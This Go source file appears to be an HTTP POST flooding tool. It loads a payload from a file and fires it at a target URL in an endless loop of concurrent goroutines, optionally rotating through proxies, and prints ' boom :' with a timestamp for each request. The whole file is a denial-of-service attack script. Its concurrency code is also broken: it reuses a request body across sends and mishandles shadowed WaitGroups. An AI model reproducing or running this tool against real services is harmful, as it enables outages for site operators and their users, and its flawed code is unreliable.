package engines

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"sync"
	"time"
)

func postHandler(req *http.Request) string {

	// Set the Content-Type header
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send the HTTP request and get the response
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		// Handle error
		fmt.Println(err)
		return "error"
	}

	// Read the response body
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// Handle error
		fmt.Println(err)
		return "error"
	}
	return string(body)

}

func postHandlerProxy(req *http.Request, proxy string) string {
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	proxyUrl, err := url.Parse("http://" + proxy)
	if err != nil {
		// Handle error
		fmt.Println(err)
		return "error"
	}
	//create a new http client
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyUrl),
		}}
	//set http client like a mozilla browser
	//client timeout after 1 second
	client.Timeout = time.Millisecond * 1000
	resp, err := client.Do(req)
	if err != nil {
		// Handle error
		fmt.Println(err)
		return "error"
	}
	// Read the response body
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// Handle error
		fmt.Println(err)
		return "error"
	}

	// Print the response body
	fmt.Println(string(body))
	return string(body)

}

func Post(url string, proxys []string, cpu int, post_file string) {
	if len(proxys) == 0 {
		data, err := ioutil.ReadFile(post_file)
		if err != nil {
			// Handle error
			fmt.Println(err)
			return
		}
		// Create an HTTP request from the file contents
		req, err := http.NewRequest("POST", url, strings.NewReader(string(data)))
		if err != nil {
			// Handle error
			fmt.Println(err)
			return
		}
		runtime.GOMAXPROCS(runtime.NumCPU())
		for {
			var wg sync.WaitGroup
			for i := 0; i < cpu; i++ {
				wg.Add(1)
				go func() {
					//use func handler
					code := postHandler(req)
					fmt.Println(code, " boom :", time.Now().Format("15:04:05.000"))
					wg.Done()
				}()
			}
			wg.Wait()
			fmt.Println("All threads are dead, restarting")
		}
	}

	if len(proxys) > 0 {
		data, err := ioutil.ReadFile(post_file)
		if err != nil {
			// Handle error
			fmt.Println(err)
			return
		}
		// Create an HTTP request from the file contents
		req, err := http.NewRequest("POST", url, strings.NewReader(string(data)))
		if err != nil {
			// Handle error
			fmt.Println(err)
			return
		}
		runtime.GOMAXPROCS(cpu)
		wg := sync.WaitGroup{}
		for {
			wg.Add(1)
			for _, proxy := range proxys {
				var wg sync.WaitGroup
				go func() {
					//use func handler
					code := postHandlerProxy(req, proxy)
					fmt.Println(code, " boom :", time.Now().Format("15:04:05.000"))
					wg.Done()
				}()
				fmt.Println("All threads are dead, restarting")
			}
			wg.Wait()
		}
	}

}
